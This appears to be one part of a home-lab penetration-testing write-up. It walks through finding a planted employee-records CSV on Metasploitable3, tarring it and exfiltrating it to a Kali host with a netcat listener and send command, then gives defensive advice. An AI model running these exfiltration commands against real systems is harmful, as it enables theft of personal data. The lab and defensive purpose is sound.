# Part 5: Exfiltration

*MITRE ATT&CK: T1041 Exfiltration Over C2 Channel, T1560 Archive Collected Data*

**Goal:** Find and exfiltrate the sensitive employee data on Metasploitable3 back to Kali.

---

## Starting Position

- Shell on: Metasploitable3 (`192.168.200.10`) as `root`
- Target file: `/opt/corpnet/finance/employee_records.csv`
- Exfil destination: Kali (`192.168.100.10`)

---

## Step 1: Data Discovery

```bash
find / -name "*.csv" 2>/dev/null
```

The search returned Ruby gem fixture files and one sensitive file planted in Part 0:

```
/opt/corpnet/finance/employee_records.csv
```

```bash
cat /opt/corpnet/finance/employee_records.csv
```

**Contents:**
```
Name,Department,Salary,SSN
John Smith,Engineering,95000,123-45-6789
Sarah Lee,Finance,88000,987-65-4321
Mike Torres,HR,720000,555-12-3456
```

![find *.csv sweep — employee_records.csv located at /opt/corpnet/finance/; cat confirms contents](../screenshots/phase5-find-and-stage.png)

---

## Step 2: Staging

Compressed the entire finance directory into a tar archive before transfer:

```bash
tar czf /tmp/exfil.tar.gz /opt/corpnet/finance/
ls -lh /tmp/exfil.tar.gz
# -rw-r--r-- 1 root root 287 Apr  19:44 /tmp/exfil.tar.gz
```

---

## Step 3: Exfiltration

**Method:** Netcat over raw TCP. Metasploitable3 can reach Kali via Ubuntu's routing.

```bash
# On Kali — listener
nc -lvnp 6666 > ~/Desktop/exfil.tar.gz

# On Metasploitable3 — send
nc 192.168.100.10 6666 < /tmp/exfil.tar.gz
```

**Verified archive contents on Kali:**

```bash
tar tzf ~/Desktop/exfil.tar.gz
```

![tar tzf on Kali — opt/corpnet/finance/employee_records.csv present in received archive](../screenshots/phase5-exfil-verify-tar.png)

**Extracted and confirmed data:**

```bash
tar xzf ~/Desktop/exfil.tar.gz -C ~/Desktop/
cat ~/Desktop/opt/corpnet/finance/employee_records.csv
```

![Extracted employee_records.csv read on Kali — full Name/Department/Salary/SSN data confirmed received](../screenshots/phase5-exfil-confirmed.png)

Attack chain complete.

---

## Attack Chain Summary

| Part | Technique | Outcome |
|---|---|---|
| Recon | Nmap full port scan + Gobuster directory brute force | Mapped target, found DVWA upload path |
| Initial Access | DVWA file upload, PHP web shell, reverse shell | Interactive shell as www-data |
| Privilege Escalation | SUID `find` binary abuse | Root on Ubuntu |
| Lateral Movement | SSH reverse tunnel, ProFTPD modcopy, PwnKit | Root on Metasploitable3 |
| Exfiltration | tar + netcat | employee_records.csv received on Kali |

---

## What I Would Do Differently (Defense)

**Enable auditd on both Ubuntu and Metasploitable3.** This was actually done during the blue team phase. Process-level logging catches SUID abuse, shell spawns, and file access to sensitive paths that syslog never sees. A rule on `/opt/corpnet` access would have flagged the exfil prep immediately. See [Detection Engineering](../blue-team/detection-engineering.md) for how this was implemented.

**Restrict SUID binaries.** Audit with `find / -perm -4000 -type f` and remove the SUID bit from anything that does not strictly require it. `find`, `vim`, and scripting interpreters have no business running as root.

**Deploy NetFlow or a network DLP solution.** Raw netcat transfers over TCP have no application-layer protocol. No HTTP or FTP headers to identify the session as data exfiltration. Without byte-count analysis on unexpected outbound flows, or NetFlow correlation flagging Metasploitable3 talking directly to Kali, this transfer was invisible to any SIEM.

---

## Key Takeaways

- **Attackers only need one path.** Every part of this chain required working around a constraint: no direct route, no root, unpatched services. Defense requires closing all gaps simultaneously. Offense only needs one to stay open.
- **Encryption hides lateral movement.** SSH tunneling made the Metasploitable3 exploitation invisible to network-level monitoring. Once an attacker has SSH access to a pivot host, the internal network is effectively open to traffic that looks like normal SSH sessions.
- **The most dangerous finding in this lab was the dual-homed host.** Ubuntu's position spanning both networks made everything else possible. A machine that sits at a network boundary with root-accessible credentials is the highest-value target in the environment.

---

[Part 4: Lateral Movement](part4-lateral-movement.md) | [Back to README](../README.md)
